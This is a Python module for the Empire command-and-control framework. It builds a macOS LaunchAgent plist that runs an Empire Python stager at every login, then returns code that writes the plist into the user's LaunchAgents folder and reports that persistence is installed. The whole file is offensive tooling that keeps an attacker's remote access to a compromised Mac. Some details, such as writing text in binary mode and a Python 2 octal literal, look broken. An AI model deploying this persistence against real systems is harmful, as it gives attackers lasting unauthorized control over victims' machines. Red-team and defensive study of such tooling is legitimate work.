from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        plist_name = params["PLISTName"]
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')

        plistSettings = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>{plist_name}</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>{launcher}</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
"""

        return f"""
import subprocess
import sys
import base64
import os


plistPath = "/Library/LaunchAgents/{plist_name}"

if not os.path.exists(os.path.split(plistPath)[0]):
    os.makedirs(os.path.split(plistPath)[0])

plist = \"\"\"
{plistSettings}
\"\"\"

homedir = os.getenv("HOME")

plistPath = homedir + plistPath

e = open(plistPath,'wb')
e.write(plist)
e.close()

os.chmod(plistPath, 0644)


print("\\n[+] Persistence has been installed: /Library/LaunchAgents/{plist_name}")

"""
